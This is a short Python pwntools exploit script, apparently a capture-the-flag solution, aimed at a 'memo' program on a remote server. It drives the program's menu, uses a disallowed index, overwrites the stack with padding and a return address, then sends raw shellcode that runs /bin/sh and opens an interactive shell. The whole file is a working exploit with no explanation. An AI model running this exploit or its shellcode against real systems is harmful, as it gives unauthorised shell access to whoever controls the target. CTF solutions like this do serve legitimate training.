from pwn import *

context.log_level='DEBUG'

local = 0
if local:
	r = process('./memo')
	pause()
else:
	r = remote("54.202.7.144", 8888)
	pause()


#set name
r.recvuntil(":")
r.sendline("helloworld")
r.recvuntil(")")
# no passwd
r.sendline("n")

#leave msg 1
r.recvuntil(">> ")
r.sendline("1")
r.recvuntil(":")
r.sendline("1") #index
r.recvuntil(":")
r.sendline("10") #length
r.recvuntil(":")
r.sendline("A"*9)

r.recvuntil(">> ")

r.sendline("1")
r.recvuntil("Index: ")
r.sendline("6")
r.recvuntil("index\n") # can't use this index\n

# overwrite stack
r.sendline("2")
r.recvuntil(": ")
r.sendline("A"*0x18 + p64(0x400b47))
r.recvuntil("here")

r.sendline("\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")

r.interactive()

